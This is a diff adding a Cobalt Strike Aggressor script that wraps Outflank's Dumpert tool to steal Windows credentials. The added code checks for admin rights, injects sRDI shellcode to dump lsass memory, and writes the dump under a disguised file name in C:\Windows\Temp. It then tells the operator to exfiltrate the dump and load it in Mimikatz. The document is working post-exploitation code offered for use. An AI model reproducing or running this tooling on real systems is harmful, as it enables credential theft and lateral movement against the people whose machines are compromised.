@@ -1,0 +1,49 @@
+
+ item "Dumpert  - T1003" {
+			local('$bid');
+				foreach $bid ($1){
+					dumpert($bid);
+				}
+
+ }   
+ 
+
+
+#register help
+beacon_command_register("dumpert", "Create a minidump of lsass process",
+	"Synopsis: dumpert\n\n" .
+	"Creates a minidump of lsass process using sRDI shellcode injection and downloads minidump file.\n" .
+	"Lsass minidump can be imported in Mimikatz using: \"sekurlsa::minidump dumpert.dmp\"");
+
+alias dumpert {
+    $bid = $1;
+    $curr_pid = beacon_info($bid, "pid");
+
+    if (-isadmin $bid) {
+        blog($bid, "Dumpert by Outflank");
+        if (-is64 $bid) {
+            bshinject($bid, $curr_pid, "x64", script_resource("exe/Outflank-Dumpert.bin"));
+            blog($bid, "The file being written will be in C:\\Windows\\Temp as ATPLogs.csv, please download//exfiltrate this when convenient and turn the file into a .dmp to use with mimikatz minidump");
+            bpause($bid, 10000);
+            return;
+        }
+        else{
+            berror($bid, "Dumpert is x64 only.");
+            return;
+        }
+    }
+    else{
+        berror($bid, "You need elevated privileges.");
+        return;
+    }
+}
+
+sub dumpert{
+fireAlias($1, "dumpert" );    
+}
+
+###############################
+##
+## End Modified Dumpert
+##
+##############################
